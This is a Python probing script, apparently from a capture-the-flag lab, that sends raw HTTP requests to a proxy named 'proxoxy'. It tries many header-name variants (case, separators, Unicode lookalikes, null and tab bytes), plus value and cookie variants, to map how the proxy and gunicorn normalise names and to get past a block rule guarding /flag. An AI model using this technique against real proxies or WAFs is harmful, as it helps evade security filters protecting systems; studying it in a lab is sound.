#!/usr/bin/env python3
"""
Read proxoxy's header-name normalisation straight out of the running binary.

Oracle: rule 2 (`headers.brevski contains george`) is the block. For a candidate name N we send
`N: george`; BLOCKED means proxoxy's stored form of N equals `brevski` ASCII-case-insensitively.
The envdump backend additionally reports which environ key gunicorn built, so each row shows both
normalisations at once.

Usage: python3 namemap.py <host> <port>       (58888 = local envdump lab)
"""
import socket, sys, json

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 58888


def probe(raw):
    out = b""
    try:
        s = socket.create_connection((HOST, PORT), 5)
        s.settimeout(3.0)
        s.sendall(raw)
        while True:
            try:
                d = s.recv(65536)
            except (socket.timeout, TimeoutError):
                break
            if not d:
                break
            out += d
        s.close()
    except OSError as e:
        return "CONNERR", repr(e)[:30], out
    if not out:
        return "BLOCKED", "", out
    if b"HTTP_keys" not in out:
        return "REJECT", out.split(b"\r\n")[0].decode("latin-1")[:30], out
    j = json.loads(out.split(b"\r\n\r\n", 1)[1])
    keys = [k[5:] for k in j["HTTP_keys"] if k not in ("HTTP_HOST", "HTTP_CONNECTION")]
    return "FWD", ",".join(keys), out


def line(name_bytes, value=b"george"):
    return (b"POST /flag HTTP/1.1\r\nHost: h\r\n" + name_bytes + b": " + value +
            b"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")


NAMES = [
    b"brevski", b"BREVSKI", b"Brevski", b"bReVsKi", b"brevskI", b"BrEvSkI",
    b"brev_ski", b"brev-ski", b"brevski_", b"_brevski", b"brevski-", b"-brevski",
    b"brevskii", b"brevsk", b"brevskj", b"brevsk1", b"brevskibrevski", b"x-brevski",
    b"brev.ski", b"br.ev.ski", b"brevski.", b"brevski|", b"brevski~", b"brevski^",
    b"brevski`", b"brevski*", b"brevski+", b"brevski!", b"brevski#", b"brevski$",
    b"brevski%", b"brevski&", b"brevski'",
    b"brevski\xdf", b"brev\xdfski", b"brevsk\xc4\xb1", b"brevsk\xc5\xbfi",
    b"brevs\xe2\x84\xaai", b"brevski\x00", b"brevski\t", b"brevski ",
    b"BREVSKI\xdf", b"\xc3\x82brevski",
]

print("target %s:%d" % (HOST, PORT))
print("%-22s %-9s %s" % ("name", "verdict", "gunicorn environ key(s)"))
tbl = {}
for n in NAMES:
    v, info, _ = probe(line(n))
    tbl[n] = v
    print("%-22s %-9s %s" % (repr(n)[1:], v, info))

print("\n-- value-side control: name brevski, value variants --")
for val, tag in ((b"george", "george"), (b"zzz", "zzz"), (b"GEORGE", "GEORGE"),
                 (b"georgeX", "georgeX"), (b" george ", "SP george SP")):
    v, info, _ = probe(line(b"brevski", val))
    print("%-22s %-9s %s" % (tag, v, info))

print("\n-- cookies. config-difference test --")
for ck, tag in ((b"brevski=george", "brevski=george"),
                (b"a=1; brevski=george", "a=1; brevski=george"),
                (b"brevski=zzz", "brevski=zzz"),
                (b"BREVSKI=george", "BREVSKI=george")):
    raw = (b"POST /flag HTTP/1.1\r\nHost: h\r\nCookie: " + ck +
           b"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
    v, info, _ = probe(raw)
    print("%-22s %-9s %s" % (tag, v, info))
